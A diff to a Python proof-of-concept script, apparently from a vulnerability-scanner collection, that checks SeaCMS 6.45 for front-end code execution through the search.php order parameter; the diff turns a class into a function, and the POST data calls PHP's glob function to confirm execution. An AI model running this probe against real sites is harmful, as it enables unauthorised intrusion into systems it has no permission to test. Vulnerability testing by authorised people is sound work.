@@ -10,14 +10,7 @@ import sys
 import json
 import requests
 import warnings
-
-
-
-class order_code_exec:
-    def __init__(self, url):
-        self.url = url
-
-    def run(self):
+def run(url):
         result = ['seacms 6.45 search.php order参数前台代码执行','','']
         headers = {
             "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
@@ -29,7 +22,7 @@ class order_code_exec:
             "func":"glob",
             "cmd":"comment.php"
         }
-        vulnurl = self.url + payload
+        vulnurl = url + payload
         try:
             req = requests.post(vulnurl, data=post_data, headers=headers, timeout=10, verify=False)
             if r"comment.php" in req.text:
@@ -44,5 +37,5 @@ class order_code_exec:
 
 if __name__ == "__main__":
     warnings.filterwarnings("ignore")
-    testVuln = vorder_code_exec(sys.argv[1])
-    testVuln.run()
+    testVuln = run(sys.argv[1])
+
